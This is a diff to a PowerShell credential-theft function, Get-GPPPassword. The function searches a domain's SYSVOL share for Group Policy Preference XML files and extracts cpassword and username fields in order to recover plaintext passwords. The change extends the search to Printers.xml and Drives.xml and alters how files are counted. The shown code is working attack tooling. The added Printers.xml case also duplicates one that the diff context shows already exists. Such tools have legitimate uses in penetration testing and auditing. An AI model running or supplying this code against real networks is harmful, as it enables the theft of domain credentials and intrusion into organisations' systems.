@@ -13,7 +13,7 @@ function Get-GPPPassword {
  
 .DESCRIPTION
 
-    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
+    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml, datasources.xml, printers.xml, and drives.xml and returns plaintext passwords.
 
 .EXAMPLE
 
@@ -154,7 +154,19 @@ function Get-GPPPassword {
                     'DataSources.xml' { 
                         $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                         $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
+                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                    }
+					
+                    'Printers.xml' { 
+                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                    }
+
+                    'Drives.xml' { 
+                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
+                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                     }
                     
                     'Printers.xml' { 
@@ -208,11 +220,11 @@ function Get-GPPPassword {
     
         #discover potential files containing passwords ; not complaining in case of denied access to a directory
         Write-Verbose 'Searching the DC. This could take a while.'
-        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
+        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
     
         if ( -not $XMlFiles ) {throw 'No preference files found.'}
 
-        Write-Verbose "Found $($XMLFiles.Count) files that could contain passwords."
+        Write-Verbose "Found $($XMLFiles | Measure-Object | select -ExpandProperty Count) files that could contain passwords."
     
         foreach ($File in $XMLFiles) {
             $Result = (Get-GppInnerFields $File.Fullname)
